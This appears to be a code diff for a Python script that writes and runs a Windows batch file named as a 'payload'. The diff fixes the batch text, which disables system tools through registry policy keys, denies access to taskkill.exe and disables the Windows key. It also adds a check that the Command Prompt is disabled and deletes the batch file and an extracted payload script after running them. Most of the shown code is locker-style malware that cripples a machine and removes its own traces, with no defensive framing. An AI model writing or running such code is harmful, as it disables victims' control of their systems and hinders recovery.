@@ -7,7 +7,7 @@ import subprocess
 print("Start Payload")
 
 # The content of the batch file that will be executed with administrator privileges
-batch_content = '''@echo off
+batch_content = r'''@echo off
 :: Check if the script is running as administrator
 ::NET SESSION >nul 2>&1
 ::if %errorlevel% neq 0 (
@@ -30,7 +30,7 @@ reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Disa
 
 :: Prevent taskkill from running (make it read-only)
 echo Preventing taskkill.exe from being executed...
-icacls "C:\\Windows\\System32\\taskkill.exe" /deny Everyone:(R)
+icacls "C:\Windows\System32\taskkill.exe" /deny Everyone:(R)
 
 :: Disable Windows Key
 echo Disabling Windows Key without restart...
@@ -54,12 +54,35 @@ print("Just created the bat")
 with open(batch_file, 'w') as f:
     f.write(batch_content)
 
+def check_cmd_disabled():
+    try:
+        # Try to run a basic command in Command Prompt
+        subprocess.run(["cmd", "/c", "echo Hello, World!"], check=True)
+        print("Command Prompt is enabled.")
+    except subprocess.CalledProcessError as e:
+        print("Command Prompt seems to be disabled.")
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+
 def windows_payload():
-    subprocess.run(["cmd.exe", "/c", "admin_script.bat"])
+    try:
+        # subprocess.run(
+        #     ["cmd", "/c", "admin_script.bat"],
+        #     creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide the command window
+        # )
+        subprocess.run(
+            ["cmd", "/c", "admin_script.bat"]
+        )
+        print("Batch file executed successfully!")
+    except Exception as e:
+        print(f"Error executing batch file: {e}")
+
     os.remove("./admin_script.bat")
-    os.remove("")
+    os.remove("./extracted_payload.py")
 
 windows_payload()
+check_cmd_disabled()
 
 # #Run the batch file with administrator privileges without prompts
 # try:
